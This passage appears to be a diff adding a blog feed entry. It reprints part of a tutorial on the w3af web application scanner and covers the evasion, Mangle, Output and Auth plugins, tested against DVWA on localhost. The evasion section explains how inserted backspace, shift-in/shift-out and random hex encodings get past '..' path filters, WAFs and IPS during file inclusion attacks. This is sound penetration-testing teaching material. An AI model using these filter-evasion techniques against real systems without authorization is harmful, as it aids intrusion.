+<p><p>a)backSpaceBetweenDots &ndash; This plugin is used to bypass the filters for the character <i>&ldquo;..&rdquo;</i>. It does this by adding a character after a dot (.) and then adding a backspace character (%08) after it. Hence he character after the dot and the backspace character cancel each other thereby leaving only <i>&ldquo;..&rdquo;</i> . This plugin could be used while performing Local File Inclusion or Remote file Inclusion attacks.</p>
+
+<p><p>b)ShiftOutShiftInBetweenDots &ndash; This plugin works similar to the backSpaceBetweenDots plugin and is used to bypass filters for <i>&ldquo;..&rdquo;</i>. It just uses shift-in (%0E) and shift-out (%0F) characters which cancel each other out. </p></p>
+
+<p><p>c)rndHexEncode &ndash; This plugin adds random hex encoding in the url thereby making it difficult for different WAF or IPS. </p></p>
+
+<p><p><b>4)Mangle</b> &ndash; This plugin is used to modify request and responses on the fly using regular expressions. There are 3 configurable parameters, Expressions, fixContentLen and priority. In the expression option, we specify the expression which determines the rules by which the request or response will be changed. The figure below from w3af gui shows 2 examples of using Stream editing expression.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/Screen Shot 2012-03-21 at 2.56.03 PM.png" width="707" height="399" alt="Screen Shot 2012 03 21 At 2.56.03 PM"></p>
+
+<p><p>As shown in the figure below, i have configured w3af to look for the expression Google in the response body and replace it with the string Poogle.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/13.png" width="745" height="337" alt="13"></p>
+
+<p><p><b>5)Output</b>-The output plugin helps us decide the format in which we want the output. w3af supports many formats like console, emailReport, html, xml, text etc. Again you can set various parameters here like the filename, verbosity etc. In the figure below, i have set <i>verbose</i> to True in the htmlFile plugin as i want a very detailed report about the application that i am testing.</p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/14.png" width="1096" height="551" alt="14"></p>
+
+<p><p><b>6)Auth</b> -Last but not the least, the  auth plugin is one of the most important plugins in w3af. It is present only in newer versions of w3af. Hence, it is important to keep updated with the latest versions of w3af as a lot of bug fixes and performance enhancements are done with each release. Their is only one plugin named generic in auth plugins list. The main use of auth plugin comes in when w3af hits a login form while crawling a web application. Being a good scanner, it should be able to submit the credentials automatically in order to continue looking for information. By using this plugin, we can specify a predefined username/password that w3af should enter itself whenever it hits a login form. We need to specify all the parameters for the generic plugin in order for it to work successfully. </p></p>
+
+<p><p>In the figure below i am setting options for w3af to successfully log in to DVWA (Damn vulnerable web application) which is located on the address <a href="http://127.0.0.1/dvwa">http://127.0.0.1/dvwa</a></p></p>
+
+<p><img src="http://prateek147.github.io/images/posts/w3af3/15.png" width="1023" height="581" alt="15"></p>
+
+<p><h2>Conclusion</h2></p>
+
+<p><p>In this article, we looked at some of the plugins in w3af like bruteForce, Mangle, Grep, Evasion and Auth and looked at how they aid us in the process of Web Application Penetration Testing. In the fourth and final part of this series, we will look at the various tools in w3af like <i>Manual Request</i> editor, <i>Encoder</i>, <i>Decoder</i>, <i>Mitm-Proxy</i> etc. We will also look at a topic called <i>w3af scripting</i> through which it is possible to write w3af scripts which can perform the scans for us.</p></p>
+
+<p><p>Please drop a comment if you liked the article or if there is something about w3af that you want to see in the upcoming article.</p></p>
+
+<p><h2>References:</h2></p>
+
+<p><ol>
+ <li><p>w3af User Guide</br><a href ="http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf"><a href="http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf">http://w3af.sourceforge.net/documentation/user/w3afUsersGuide.pdf</a></a></p>
+ </li>
+<li><p>w3af-Plugins and descriptions</br><a href="http://w3af.sourceforge.net/plugin-descriptions.php"><a href="http://w3af.sourceforge.net/plugin-descriptions.php">http://w3af.sourceforge.net/plugin-descriptions.php</a></a></p>
+ </li>
+<li><p>w3af Walkthrough and Tutorial Part 1</br><a href ="http://resources.infosecinstitute.com/w3af-tutorial/"><a href="http://resources.infosecinstitute.com/w3af-tutorial/">http://resources.infosecinstitute.com/w3af-tutorial/</a></a></p>
+</ol></p>
+
+<p><p>This article was originally published on the <a href="http://resources.infosecinstitute.com/">resources</a> page at <a href="http://infosecinstitute.com/">Infosec Institute</a>. For more information, please visit my author <a href="http://resources.infosecinstitute.com/author/prateek/">page</a>.</p></p>
+]]></content>
+  </entry>
+  
+</feed>
